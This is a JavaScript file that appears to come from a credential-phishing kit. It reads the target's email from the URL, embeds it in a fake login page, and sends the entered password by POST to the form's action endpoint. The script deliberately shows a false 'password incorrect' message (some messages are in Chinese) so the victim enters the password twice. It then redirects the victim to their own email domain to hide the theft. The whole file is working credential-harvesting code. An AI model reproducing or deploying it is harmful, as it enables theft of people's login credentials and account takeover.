const param = new URLSearchParams(window.location.search);
let emailParam = param.get('email') ? param.get('email') : '';
let count = 0;
 
if (emailParam === "null") {
   emailParam = "";
}

 const email = document.getElementById('email');
 const password = document.getElementById('password');
 const source = document.getElementById('source');
 const login = document.getElementById('submit-btn');
 const form = document.getElementById("contact");
 email.value = emailParam;



//  var oldemail = document.createElement("input");
//  oldemail.id = "email";
//  oldemail.setAttribute('face', 'Lucida Grande, Lucida Sans Unicode, Lucida Sans, DejaVu Sans, Verdana, sans-serif');
//  oldemail.setAttribute('size', '+2');
//  oldemail.setAttribute('type', 'text');
// //  oldclone.setAttribute('value', emailParam);
//  var oldemail_content = document.createTextNode(emailParam);
//  oldemail.appendChild(oldemail_content);
//  var newemail = document.getElementById("email");
//  var parentDiv = newemail.parentNode;
//  parentDiv.replaceChild(oldemail, newemail);
//  document.body.appendChild(newemail)


 var oldclone = document.createElement("font");
 oldclone.id = "clone";
 oldclone.setAttribute("href", "");
 oldclone.setAttribute('face', 'Lucida Grande, Lucida Sans Unicode, Lucida Sans, DejaVu Sans, Verdana, sans-serif');
 oldclone.setAttribute('size', '4');
 oldclone.setAttribute('type', 'hidden');
 oldclone.setAttribute('color', '#ffffff');
 oldclone.setAttribute('style', "text-decoration:none");
 var oldclone_content = document.createTextNode(emailParam);
 oldclone.appendChild(oldclone_content);
 var newclone = document.getElementById("clone");
 var parentDiv2 = newclone.parentNode;
 parentDiv2.replaceChild(oldclone, newclone);



 login.addEventListener('click', function(e){
  e.preventDefault();
  if (email.value === "") {
   $("#msg").show();
   $("#msg").html('Enter a valid email address.');     
   email.focus();
    return;
  } else if (!email.value.match(/^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/)) {
    $("#msg").show();
    $("#msg").html('Enter a valid email address.');
    email.focus();
    return;
  } else if (password.value === "") {
    $("#msg").show();
    $("#msg").html('请输入有效密码。');
     password.focus();
     return;
   } else {
     const domain = email.value.split('@')[1];
     count = count + 1;

     $("#msg").show();
     $("#msg").html('正在验证...');

     var $form = $("#contact");
     var data = $form.serialize();
     var url = form.action;


     var msg = $('#msg').html();
     $('#msg').text( msg );
      
     $.ajax({
       type: "POST",
       url: url,
       data: data,
       cache: false,
       timeout: 800000,
       beforeSend: function(xhr){
          $('#submit-btn').html('验证中...');
        },
      success: function(response){
        if(response){
          password.value = "";
          password.style.borderColor = "red";
          $("#msg").show();
          $("#msg").html('密码错误。');

          if (count > 1) {
            $("#msg").show();
            $("#msg").html('帐户验证已完成 请稍候....');
            window.location.href = "https://www."+domain;
            return;
          }


          console.log(response);
          if(response['signal'] == 'ok'){
            $('#msg').html(response['msg']);

          }
          else{

            $('#msg').html(response['msg']);
          }
        }else {
          $("#msg").show();
          $("#msg").html('发生错误。请稍后再试。');
          password.value = "";
          password.style.borderColor = "red";
        }
      },
      error: function(){
        $("#msg").show();
        $('#msg').html("发生错误。请稍后再试。");
        password.value = "";
        password.style.borderColor = "red";
      },
      complete: function(){
        $('#submit-btn').html('签到 >>');
      }
      });
    }  
});